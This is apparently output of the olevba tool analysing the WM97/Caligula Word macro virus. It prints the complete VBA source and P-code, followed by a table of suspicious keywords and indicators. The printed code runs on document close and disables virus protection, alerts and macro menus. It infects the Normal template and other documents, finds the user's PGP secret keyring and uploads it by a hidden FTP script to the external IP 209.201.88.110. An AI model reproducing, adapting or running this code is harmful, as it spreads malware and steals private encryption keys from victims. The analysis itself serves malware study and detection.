olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Spooky.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Spooky.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Caligula.bas 
in file: ./Virus.MSWord.Spooky.d - OLE stream: 'Macros/VBA/Caligula'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

On Error Resume Next
    
With Dialogs(wdDialogFileSummaryInfo)
.Author = "Opic"
.Title = "WM97/Caligula Infection"
.Subject = "A Study In Espionage Enabled Viruses."
.Comments = "The Best Security Is Knowing The Other Guy Hasn't Got Any."
.Keywords = " | Caligula | Opic | CodeBreakers | "
.Execute
End With

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False

CommandBars("tools").Controls("Macro").Enabled = False
CommandBars("tools").Controls("Customize...").Enabled = False
CommandBars("view").Controls("Toolbars").Enabled = False
CommandBars("view").Controls("Status Bar").Enabled = False

If NormalTemplate.VBProject.VBComponents.Item("Caligula").Name <> "Caligula" Then
NotInNorm = True
ActiveDocument.VBProject.VBComponents("Caligula").Export "c:\io.vxd"
Set Dobj = NormalTemplate.VBProject
ElseIf ActiveDocument.VBProject.VBComponents.Item("Caligula").Name <> "Caligula" Then
NotInActiv = True
NormalTemplate.VBProject.VBComponents("Caligula").Export "c:\io.vxd"
Set Dobj = ActiveDocument.VBProject
End If

If NotInNorm = True Or NotInActiv = True Then Dobj.VBComponents.Import ("c:\io.vxd")

If Day(Now) = 31 Then MsgBox "No cia," & vbCr & "No nsa," & vbCr & "No satellite," & vbCr & "Could map our veins.", 0, "WM97/Caligula (c) Opic [CodeBreakers 1998]"

If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Caligula") = False) Then

pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command", "")
Position = InStr(1, pgppath, "pgpt")

If Position <> 0 Then
pgppath = Mid(pgppath, 1, Position - 2)
Else
GoTo noPGP
End If

With Application.FileSearch
    .FileName = "\Secring.skr"
    .LookIn = pgppath
    .SearchSubFolders = True
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    .Execute
    PGP_Sec_Key = .FoundFiles(1)
End With

Randomize
  For i = 1 To 4
    NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"

Open "c:\cdbrk.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "binary"
    Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
    Print #1, "quit"
    Close #1

Shell "command.com /c ftp.exe -n -s:c:\cdbrk.vxd", vbHide

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Caligula") = True

End If

noPGP:

If NotInActiv = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub ToolsMacro()
Dim Answer
Answer = MsgBox("Not enough Memory to execute !", vbOKOnly + vbCritical, "Warning")
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Spooky.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Caligula - 5974 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #5:
' 	LitStr 0x0004 "Opic"
' 	MemStWith Author 
' Line #6:
' 	LitStr 0x0017 "WM97/Caligula Infection"
' 	MemStWith Title 
' Line #7:
' 	LitStr 0x0025 "A Study In Espionage Enabled Viruses."
' 	MemStWith Subject 
' Line #8:
' 	LitStr 0x003A "The Best Security Is Knowing The Other Guy Hasn't Got Any."
' 	MemStWith Comments 
' Line #9:
' 	LitStr 0x0024 " | Caligula | Opic | CodeBreakers | "
' 	MemStWith Keywords 
' Line #10:
' 	ArgsMemCallWith Execute 0x0000 
' Line #11:
' 	EndWith 
' Line #12:
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #16:
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #20:
' Line #21:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #22:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #23:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #24:
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Status Bar"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #25:
' Line #26:
' 	LitStr 0x0008 "Caligula"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Caligula"
' 	Ne 
' 	IfBlock 
' Line #27:
' 	LitVarSpecial (True)
' 	St NotInNorm 
' Line #28:
' 	LitStr 0x0009 "c:\io.vxd"
' 	LitStr 0x0008 "Caligula"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #29:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set Dobj 
' Line #30:
' 	LitStr 0x0008 "Caligula"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Caligula"
' 	Ne 
' 	ElseIfBlock 
' Line #31:
' 	LitVarSpecial (True)
' 	St NotInActiv 
' Line #32:
' 	LitStr 0x0009 "c:\io.vxd"
' 	LitStr 0x0008 "Caligula"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #33:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set Dobj 
' Line #34:
' 	EndIfBlock 
' Line #35:
' Line #36:
' 	Ld NotInNorm 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NotInActiv 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "c:\io.vxd"
' 	Paren 
' 	Ld Dobj 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #37:
' Line #38:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "No cia,"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "No nsa,"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000D "No satellite,"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0014 "Could map our veins."
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x002A "WM97/Caligula (c) Opic [CodeBreakers 1998]"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #39:
' Line #40:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0008 "Caligula"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #41:
' Line #42:
' 	LitStr 0x0000 ""
' 	LitStr 0x0037 "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St pgppath 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld pgppath 
' 	LitStr 0x0004 "pgpt"
' 	FnInStr3 
' 	St Position 
' Line #44:
' Line #45:
' 	Ld Position 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #46:
' 	Ld pgppath 
' 	LitDI2 0x0001 
' 	Ld Position 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St pgppath 
' Line #47:
' 	ElseBlock 
' Line #48:
' 	GoTo noPGP 
' Line #49:
' 	EndIfBlock 
' Line #50:
' Line #51:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #52:
' 	LitStr 0x000C "\Secring.skr"
' 	MemStWith FileName 
' Line #53:
' 	Ld pgppath 
' 	MemStWith LookIn 
' Line #54:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #55:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #56:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #57:
' 	ArgsMemCallWith Execute 0x0000 
' Line #58:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St PGP_Sec_Key 
' Line #59:
' 	EndWith 
' Line #60:
' Line #61:
' 	ArgsCall Read 0x0000 
' Line #62:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #63:
' 	Ld NewSecRingFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St NewSecRingFile 
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	LitStr 0x0009 "./secring"
' 	Ld NewSecRingFile 
' 	Concat 
' 	LitStr 0x0004 ".skr"
' 	Concat 
' 	St NewSecRingFile 
' Line #66:
' Line #67:
' 	LitStr 0x000C "c:\cdbrk.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "put ""
' 	Ld PGP_Sec_Key 
' 	Concat 
' 	LitStr 0x0003 "" ""
' 	Concat 
' 	Ld NewSecRingFile 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #76:
' Line #77:
' 	LitStr 0x0029 "command.com /c ftp.exe -n -s:c:\cdbrk.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #78:
' Line #79:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0008 "Caligula"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #80:
' Line #81:
' 	EndIfBlock 
' Line #82:
' Line #83:
' 	Label noPGP 
' Line #84:
' Line #85:
' 	Ld NotInActiv 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub ToolsMacro())
' Line #88:
' 	Dim 
' 	VarDefn Answer
' Line #89:
' 	LitStr 0x001E "Not enough Memory to execute !"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x0007 "Warning"
' 	ArgsLd MsgBox 0x0003 
' 	St Answer 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub FileTemplates())
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub ViewVBCode())
' Line #94:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

